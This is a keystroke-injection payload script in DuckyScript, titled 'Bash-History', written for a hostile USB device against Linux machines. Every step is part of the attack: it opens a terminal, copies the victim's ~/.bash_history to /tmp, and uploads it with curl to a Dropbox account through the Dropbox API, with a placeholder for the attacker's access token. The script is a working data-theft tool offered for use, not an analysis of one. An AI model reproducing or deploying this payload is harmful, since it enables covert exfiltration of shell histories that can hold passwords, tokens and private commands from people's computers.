REM Title: Bash-History
REM Author: Zoe Ronen
REM Description: This payload is meant to exfiltrate bash history to a dropbox
REM Target: Linux

DELAY 500
INJECT_MOD WINDOWS
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 500
STRING cd /tmp
DELAY 500
ENTER
DELAY 500
STRING cp ~/.bash_history bash_history.txt
DELAY 500
ENTER
DELAY 500
STRING curl "https://content.dropboxapi.com/2/files/upload" -H "Authorization:
SPACE
REM replace the [DROPBOX_ACCESS_TOKEN] placeholder with your actual Dropbox access token
STRING Bearer [DROPBOX_ACCESS_TOKEN]" -H "Dropbox-API-Arg: {\"path\":\"/bash_history.txt\",
STRING \"mode\":\"add\",\"autorename\":true,\"mute\":false}" -H "Content-Type: application/
STRING octet-stream" --data-binary @"bash_history.txt"
DELAY 500
ENTER
